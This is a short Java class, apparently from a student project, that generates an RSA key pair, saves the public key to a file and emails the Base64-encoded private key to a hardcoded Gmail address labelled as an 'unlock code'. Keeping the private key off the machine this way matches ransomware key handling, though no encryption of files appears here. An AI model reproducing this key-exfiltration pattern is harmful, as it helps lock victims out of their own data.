/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.mycompany.decode;

import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.KeyPair;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Base64;
/**
 *
 * @author VanAnh
 */
public class SecurityKeyPairGenerator {
    private PrivateKey privateKey;
    private PublicKey publicKey;
    private String privateKeyBase64;
    public void generateKeyPair() throws Exception {
        KeyPairGenerator generator = KeyPairGenerator.getInstance("RSA");
        generator.initialize(2048);
        KeyPair pair = generator.generateKeyPair();
        this.privateKey = pair.getPrivate();
        this.publicKey = pair.getPublic();
        byte[] keyBytes = privateKey.getEncoded();
        privateKeyBase64= Base64.getEncoder().encodeToString(keyBytes);
    }

    public void saveKeys(String publicKeyFilePath) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(publicKeyFilePath)) {
            fos.write(publicKey.getEncoded());
            Email.sendEmail("buivananh01072003@gmail.com", "Ma de mo khoa: ",privateKeyBase64);
        }
        catch(Exception e){
            e.printStackTrace();
        }

    }
}
